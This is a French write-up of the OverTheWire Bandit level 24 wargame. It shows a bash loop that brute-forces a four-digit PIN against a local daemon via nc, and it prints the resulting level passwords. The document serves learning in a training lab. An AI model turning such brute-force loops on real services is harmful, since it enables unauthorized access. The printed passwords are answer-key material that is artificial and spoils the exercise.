## Over-The-Wire -writeup-
### Bandit24 (bandit24@bandit.labs.overthewire.org)

---
#### Etape 1

Un daemon écoute sur le port 30002, il demande **le mode de passe actuel, ainsi qu'un code à 4 chiffres**.  
Il faut tester les 10000 combinaisons, **brute-force**.

On va créer un script qui va tester toutes les combinaisons.

`script.sh` sera son nom.

```bash
#!/bin/bash

for i in {0..10000};
do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i";
done | nc localhost 30002 | grep -v Wrong
```

Ici, `grep -v Wrong` est rajouté parce que je sais déjà qu'à chaque tentative, le message d'erreur du daemon commence par **"Wrong"**.  
J'inverse donc le grep avec l'option **-v** *inverse*, pour ne retourner que les messages qui **ne contiennent pas "Wrong"**.

---
#### Etape 2

L'exécution du script.

```console
bandit24@bandit:/tmp/visages$ ./script.sh 
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

---
Mot de passe: **uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**

[<< bandit23.md](bandit23.md) | bandit24.md | [bandit25.md >>](bandit25.md)
